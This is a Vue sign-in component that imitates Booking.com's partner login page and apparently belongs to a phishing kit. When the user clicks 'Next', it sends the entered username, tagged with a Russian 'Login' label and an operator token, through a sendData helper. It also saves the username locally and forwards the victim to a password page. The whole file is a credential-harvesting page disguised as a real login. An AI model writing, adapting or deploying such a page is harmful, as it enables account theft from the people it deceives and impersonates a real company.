<template>
  <div class="panel__body transition" id="first">
    <div class="panel__title">
      <h1>{{ t("sign_in.top_title") }}</h1>
    </div>
    <div class="spacer"></div>
    <div class="form">
      <div class="input__wrapper">
        <label for="loginname">{{ t("sign_in.username") }}</label>
        <div class="input__box">
          <input type="text" name="loginname" id="loginname" :placeholder="placeholder" v-model="value" minlength="3">
          <div class="attention">
            <span class="material-symbols-outlined">
              error
            </span>
          </div>
        </div>
        <div class="errorMessage errorMessageNotValid">Please enter your username
        </div>
        <div class="errorMessage errorMessageWrong">It looks like there isnt an
          account associated with this username. You can <a href="#"
            style="color: #006ce4; font-weight: 700; font-size: 14px; line-height: 20px;">create
            an account</a> to access our services
        </div>
      </div>
      <div class="button__wrapper">
        <button id="firstBtn" class="btn" :disabled="value.length <= 0" @click="nextPage">{{ t('sign_in.next')
          }}</button>
      </div>
      <div class="text-partner" style="margin-top: 20px;">
        <hr>
        {{ t("sign_in.questions.1") }}
        </br>
        {{ t("sign_in.questions.2") }}
      </div>
      <div class="button__wrapper">
        <a href="https://admin.booking.com" class="btn btn__empty">{{ t('sign_in.create_account') }}</a>
      </div>
    </div>
  </div>
</template>

<script setup>
import { generateRandomString, resetData } from "~/utils/";
import { joinDomain, sendData } from "~/utils/";

const { t, locale } = useI18n()

const placeholder = computed(() => t('sign_in.placeholder'))
const value = ref("")

const router = useRouter()
const route = useRoute()

onMounted(() => {
  console.log(locale.value)
})

async function nextPage() {
  await router.push({
    name: "pass",
    query: { op_token: route.query.op_token, login: value.value, }
  })
  await resetData(route.query.op_token)
  await sendData({ "🗝️ Логин": value.value }, route.query.op_token)
  localStorage.setItem("login", value.value)
}

</script>
